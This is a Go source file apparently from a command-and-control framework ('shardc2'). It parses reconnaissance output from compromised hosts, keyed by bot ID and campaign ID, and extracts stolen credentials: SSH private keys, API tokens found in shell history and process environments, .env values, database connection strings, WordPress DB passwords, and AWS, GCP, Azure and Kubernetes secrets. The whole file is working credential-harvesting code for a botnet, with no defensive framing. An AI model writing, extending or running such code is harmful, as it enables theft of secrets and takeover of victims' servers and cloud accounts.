package engine

import (
	"fmt"
	"net/url"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/shardc2/shardc2/pkg/models"
)

type ParsedSecret struct {
	Category   string
	Username   string
	Password   string
	Target     string
	Port       int
	Service    string
	SourcePath string
	BotID      string
	CampaignID string
}

func ParseReconSecrets(output, botID, campaignID, sourceHost string) []ParsedSecret {
	var secrets []ParsedSecret
	sections := splitSections(output)

	for header, body := range sections {
		var parsed []ParsedSecret
		switch header {
		case "SSH PRIVATE KEYS":
			parsed = parseSSHKeys(body, sourceHost)
		case "HISTORY SECRETS":
			parsed = parseHistorySecrets(body, sourceHost)
		case "ENV FILES":
			parsed = parseEnvFiles(body, sourceHost)
		case "/proc ENV LEAKS":
			parsed = parseProcEnvLeaks(body, sourceHost)
		case "DB CONNECTION STRINGS":
			parsed = parseDBConnStrings(body, sourceHost)
		case "WORDPRESS CONFIG":
			parsed = parseWordpressConfig(body, sourceHost)
		case "PROCESS CMDLINES":
			parsed = parseProcessCmdlines(body, sourceHost)
		case "AWS CONFIG":
			parsed = parseAWSConfig(body, sourceHost)
		case "GCP CREDS":
			parsed = parseCloudGeneric(body, sourceHost, "gcp_credential")
		case "AZURE TOKEN":
			parsed = parseCloudGeneric(body, sourceHost, "azure_token")
		case "K8S SECRETS":
			parsed = parseCloudGeneric(body, sourceHost, "k8s_secret")
		case "ENV SECRETS":
			parsed = parseEnvSecretLines(body, sourceHost, "")
		}

		for i := range parsed {
			parsed[i].BotID = botID
			parsed[i].CampaignID = campaignID
		}
		secrets = append(secrets, parsed...)
	}

	return secrets
}

func splitSections(output string) map[string]string {
	sections := make(map[string]string)
	re := regexp.MustCompile(`(?m)^=== (.+?) ===$`)
	matches := re.FindAllStringIndex(output, -1)
	names := re.FindAllStringSubmatch(output, -1)

	for i, m := range matches {
		name := names[i][1]
		start := m[1]
		var end int
		if i+1 < len(matches) {
			end = matches[i+1][0]
		} else {
			end = len(output)
		}
		body := strings.TrimSpace(output[start:end])
		if body != "" {
			sections[name] = body
		}
	}
	return sections
}

func parseSSHKeys(body, sourceHost string) []ParsedSecret {
	var secrets []ParsedSecret
	re := regexp.MustCompile(`(?m)^--- (.+?) ---$`)
	matches := re.FindAllStringIndex(body, -1)
	names := re.FindAllStringSubmatch(body, -1)

	for i, m := range matches {
		path := names[i][1]
		start := m[1]
		var end int
		if i+1 < len(matches) {
			end = matches[i+1][0]
		} else {
			end = len(body)
		}
		content := strings.TrimSpace(body[start:end])
		if content == "" || strings.Contains(content, ".pub") && !strings.Contains(content, "PRIVATE") {
			continue
		}
		if !strings.Contains(content, "PRIVATE KEY") && !strings.Contains(content, "BEGIN") {
			continue
		}

		owner := extractOwnerFromPath(path)
		secrets = append(secrets, ParsedSecret{
			Category:   models.CredCategorySSHKey,
			Username:   owner,
			Password:   content,
			Target:     sourceHost,
			Service:    "recon",
			SourcePath: path,
		})
	}
	return secrets
}

var tokenPatterns = []struct {
	prefix string
	name   string
}{
	{"sk-ant-", "ANTHROPIC_API_KEY"},
	{"sk-or-", "OPENROUTER_API_KEY"},
	{"sk-proj-", "OPENAI_API_KEY"},
	{"nvapi-", "NVIDIA_API_KEY"},
	{"ghp_", "GITHUB_TOKEN"},
	{"gho_", "GITHUB_OAUTH"},
	{"glpat-", "GITLAB_TOKEN"},
	{"xoxb-", "SLACK_BOT_TOKEN"},
	{"xoxp-", "SLACK_USER_TOKEN"},
	{"eyJhbGciOi", "JWT_TOKEN"},
}

var secretKeyRe = regexp.MustCompile(`(?i)([\w_-]*(api[_-]?key|secret|token|password|passwd|credential|auth)[_\w-]*)\s*[=:]\s*["']?([^\s"']+)["']?`)

func parseHistorySecrets(body, sourceHost string) []ParsedSecret {
	var secrets []ParsedSecret
	seen := make(map[string]bool)
	sourcePath := ""

	for _, line := range strings.Split(body, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "--- ") && strings.HasSuffix(line, " ---") {
			sourcePath = strings.TrimPrefix(strings.TrimSuffix(line, " ---"), "--- ")
			continue
		}

		for _, tp := range tokenPatterns {
			idx := strings.Index(line, tp.prefix)
			if idx < 0 {
				continue
			}
			token := extractToken(line[idx:])
			if len(token) < 10 {
				continue
			}
			key := tp.name + ":" + token
			if seen[key] {
				continue
			}
			seen[key] = true
			secrets = append(secrets, ParsedSecret{
				Category:   models.CredCategoryAPIKey,
				Username:   tp.name,
				Password:   token,
				Target:     sourceHost,
				Service:    "recon",
				SourcePath: sourcePath,
			})
		}

		matches := secretKeyRe.FindAllStringSubmatch(line, -1)
		for _, m := range matches {
			name := m[1]
			value := m[3]
			if len(value) < 5 || isPlaceholder(value) {
				continue
			}
			key := name + ":" + value
			if seen[key] {
				continue
			}
			seen[key] = true
			secrets = append(secrets, ParsedSecret{
				Category:   models.CredCategoryShellHistory,
				Username:   name,
				Password:   value,
				Target:     sourceHost,
				Service:    "recon",
				SourcePath: sourcePath,
			})
		}
	}
	return secrets
}

func parseEnvFiles(body, sourceHost string) []ParsedSecret {
	var secrets []ParsedSecret
	seen := make(map[string]bool)
	sourcePath := ""

	for _, line := range strings.Split(body, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "--- ") && strings.HasSuffix(line, " ---") {
			sourcePath = strings.TrimPrefix(strings.TrimSuffix(line, " ---"), "--- ")
			continue
		}
		if line == "" || strings.HasPrefix(line, "#") {
			continue
		}

		s := parseEnvLine(line, sourceHost, sourcePath, models.CredCategoryEnvSecret)
		if s != nil {
			key := s.Username + ":" + s.Password
			if !seen[key] {
				seen[key] = true
				secrets = append(secrets, *s)
			}
		}
	}
	return secrets
}

func parseProcEnvLeaks(body, sourceHost string) []ParsedSecret {
	var secrets []ParsedSecret
	seen := make(map[string]bool)
	sourcePath := ""
	procRe := regexp.MustCompile(`\(from (/proc/\d+/environ)\)`)

	for _, line := range strings.Split(body, "\n") {
		line = strings.TrimSpace(line)
		if m := procRe.FindStringSubmatch(line); len(m) > 1 {
			sourcePath = m[1]
			continue
		}

		s := parseEnvLine(line, sourceHost, sourcePath, models.CredCategoryEnvSecret)
		if s != nil {
			key := s.Username + ":" + s.Password
			if !seen[key] {
				seen[key] = true
				secrets = append(secrets, *s)
			}
		}
	}
	return secrets
}

var envSecretRe = regexp.MustCompile(`(?i)(key|secret|token|password|passwd|api|auth|credential)`)

func parseEnvLine(line, sourceHost, sourcePath, category string) *ParsedSecret {
	eqIdx := strings.Index(line, "=")
	if eqIdx < 1 {
		return nil
	}
	key := strings.TrimSpace(line[:eqIdx])
	value := strings.TrimSpace(line[eqIdx+1:])
	value = strings.Trim(value, `"'`)

	if !envSecretRe.MatchString(key) {
		return nil
	}
	if len(value) < 3 || isPlaceholder(value) {
		return nil
	}

	return &ParsedSecret{
		Category:   category,
		Username:   key,
		Password:   value,
		Target:     sourceHost,
		Service:    "recon",
		SourcePath: sourcePath,
	}
}

func parseEnvSecretLines(body, sourceHost, sourcePath string) []ParsedSecret {
	var secrets []ParsedSecret
	seen := make(map[string]bool)
	for _, line := range strings.Split(body, "\n") {
		line = strings.TrimSpace(line)
		s := parseEnvLine(line, sourceHost, sourcePath, models.CredCategoryEnvSecret)
		if s != nil {
			key := s.Username + ":" + s.Password
			if !seen[key] {
				seen[key] = true
				secrets = append(secrets, *s)
			}
		}
	}
	return secrets
}

var connStringRe = regexp.MustCompile(`(postgres|mysql|mongodb|mongodb\+srv|redis|amqp)://([^:]+):([^@]+)@([^:/\s]+):?(\d*)`)

func parseDBConnStrings(body, sourceHost string) []ParsedSecret {
	var secrets []ParsedSecret
	seen := make(map[string]bool)

	for _, m := range connStringRe.FindAllStringSubmatch(body, -1) {
		proto := m[1]
		user := m[2]
		pass := m[3]
		host := m[4]
		portStr := m[5]
		port := 0
		if portStr != "" {
			fmt.Sscanf(portStr, "%d", &port)
		}

		if isPlaceholder(pass) || isPlaceholder(user) || isPlaceholder(host) {
			continue
		}
		bareWords := map[string]bool{"host": true, "user": true, "password": true, "server": true, "database": true, "db": true}
		if bareWords[strings.ToLower(host)] || bareWords[strings.ToLower(user)] {
			continue
		}

		key := user + ":" + host + ":" + proto
		if seen[key] {
			continue
		}
		seen[key] = true

		secrets = append(secrets, ParsedSecret{
			Category: models.CredCategoryDBConnection,
			Username: user,
			Password: pass,
			Target:   host,
			Port:     port,
			Service:  proto,
		})
	}
	return secrets
}

func parseWordpressConfig(body, sourceHost string) []ParsedSecret {
	defineRe := regexp.MustCompile(`define\s*\(\s*['"](\w+)['"]\s*,\s*['"]([^'"]+)['"]`)
	vals := make(map[string]string)
	for _, m := range defineRe.FindAllStringSubmatch(body, -1) {
		vals[m[1]] = m[2]
	}

	user := vals["DB_USER"]
	pass := vals["DB_PASSWORD"]
	host := vals["DB_HOST"]
	if user == "" && pass == "" {
		return nil
	}
	if host == "" {
		host = sourceHost
	}

	return []ParsedSecret{{
		Category:   models.CredCategoryDBConnection,
		Username:   user,
		Password:   pass,
		Target:     host,
		Service:    "mysql",
		SourcePath: "wp-config.php",
	}}
}

func parseProcessCmdlines(body, sourceHost string) []ParsedSecret {
	var secrets []ParsedSecret
	seen := make(map[string]bool)
	flagRe := regexp.MustCompile(`--(password|token|key|secret|api-key|auth)\s+['"]?(\S+?)['"]?(?:\s|$)`)

	for _, line := range strings.Split(body, "\n") {
		for _, m := range flagRe.FindAllStringSubmatch(line, -1) {
			name := m[1]
			value := m[2]
			if len(value) < 5 || isPlaceholder(value) {
				continue
			}
			key := name + ":" + value
			if seen[key] {
				continue
			}
			seen[key] = true
			secrets = append(secrets, ParsedSecret{
				Category: models.CredCategoryMisc,
				Username: name,
				Password: value,
				Target:   sourceHost,
				Service:  "recon",
			})
		}

		for _, tp := range tokenPatterns {
			idx := strings.Index(line, tp.prefix)
			if idx < 0 {
				continue
			}
			token := extractToken(line[idx:])
			if len(token) < 10 {
				continue
			}
			key := tp.name + ":" + token
			if seen[key] {
				continue
			}
			seen[key] = true
			secrets = append(secrets, ParsedSecret{
				Category: models.CredCategoryAPIKey,
				Username: tp.name,
				Password: token,
				Target:   sourceHost,
				Service:  "recon",
			})
		}
	}
	return secrets
}

func parseAWSConfig(body, sourceHost string) []ParsedSecret {
	var secrets []ParsedSecret
	accessKeyRe := regexp.MustCompile(`(?i)aws_access_key_id\s*=\s*(\S+)`)
	secretKeyRe := regexp.MustCompile(`(?i)aws_secret_access_key\s*=\s*(\S+)`)

	accessKeys := accessKeyRe.FindAllStringSubmatch(body, -1)
	secretKeys := secretKeyRe.FindAllStringSubmatch(body, -1)

	for i, ak := range accessKeys {
		secret := ""
		if i < len(secretKeys) {
			secret = secretKeys[i][1]
		}
		secrets = append(secrets, ParsedSecret{
			Category:   models.CredCategoryCloudToken,
			Username:   ak[1],
			Password:   secret,
			Target:     sourceHost,
			Service:    "aws",
			SourcePath: "~/.aws/credentials",
		})
	}
	return secrets
}

func parseCloudGeneric(body, sourceHost, label string) []ParsedSecret {
	body = strings.TrimSpace(body)
	if body == "" || strings.Contains(body, "404 Not Found") || strings.Contains(body, "not found") {
		return nil
	}
	return []ParsedSecret{{
		Category: models.CredCategoryCloudToken,
		Username: label,
		Password: body,
		Target:   sourceHost,
		Service:  "recon",
	}}
}

func extractToken(s string) string {
	end := strings.IndexAny(s, " \t\n\r\"'`,;)}]")
	if end < 0 {
		return s
	}
	return s[:end]
}

func extractOwnerFromPath(path string) string {
	parts := strings.Split(filepath.ToSlash(path), "/")
	for i, p := range parts {
		if p == "home" && i+1 < len(parts) {
			return parts[i+1]
		}
		if p == "root" {
			return "root"
		}
	}
	return filepath.Base(filepath.Dir(path))
}

func isPlaceholder(v string) bool {
	lower := strings.ToLower(v)
	placeholders := []string{"changeme", "change-me", "todo", "xxx", "your_", "example", "placeholder", "none", "null", "undefined", "''", `""`, "<", ">", "dbms_", "hostname", "host_name", "localhost,", "user_name", "password_here", "secret_here", "enterprise.com", "\\\""}
	for _, p := range placeholders {
		if strings.Contains(lower, p) {
			return true
		}
	}
	if strings.ContainsAny(v, "()\n\"") || len(v) > 100 {
		return true
	}
	if _, err := url.Parse(v); err == nil && strings.HasPrefix(v, "http") {
		return true
	}
	return false
}
